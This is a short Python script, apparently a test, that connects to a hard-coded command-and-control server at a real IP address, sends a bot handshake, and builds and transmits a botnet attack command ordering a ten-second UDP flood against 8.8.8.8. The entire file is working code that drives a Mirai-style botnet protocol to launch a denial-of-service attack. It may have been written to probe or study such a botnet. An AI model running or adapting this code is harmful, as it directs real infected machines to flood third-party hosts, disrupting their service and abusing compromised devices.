#!/usr/bin/env python3
import socket
import struct
import time

def test_attack_command():
    # Connect to CNC server
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('185.247.117.214', 59666))
    
    # Send bot identification (like attack.debug does)
    s.send(b'\x00\x00\x00\x01')  # Version 1
    s.send(b'\x00')  # No source string
    
    print("Connected to CNC server")
    
    # Wait a bit for connection to be established
    time.sleep(1)
    
    # Create a simple UDP attack command
    # Format: [duration(4)] [vector(1)] [targets_len(1)] [targets] [opts_len(1)] [opts]
    
    duration = 10  # 10 seconds
    vector = 0     # UDP flood
    targets_len = 1
    target_ip = socket.inet_aton('8.8.8.8')  # Test target
    netmask = 32
    opts_len = 0
    
    # Build attack packet
    packet = struct.pack('>I', duration)  # Duration (big endian)
    packet += struct.pack('B', vector)    # Vector
    packet += struct.pack('B', targets_len)  # Number of targets
    packet += target_ip + struct.pack('B', netmask)  # Target IP and netmask
    packet += struct.pack('B', opts_len)  # Number of options
    
    # Add length header (2 bytes big endian)
    length = len(packet)
    full_packet = struct.pack('>H', length) + packet
    
    print(f"Sending attack packet: {len(full_packet)} bytes")
    print(f"Packet data: {full_packet.hex()}")
    
    # Send the attack command
    s.send(full_packet)
    
    print("Attack command sent!")
    
    # Keep connection alive for a bit
    time.sleep(5)
    
    s.close()
    print("Connection closed")

if __name__ == "__main__":
    test_attack_command()
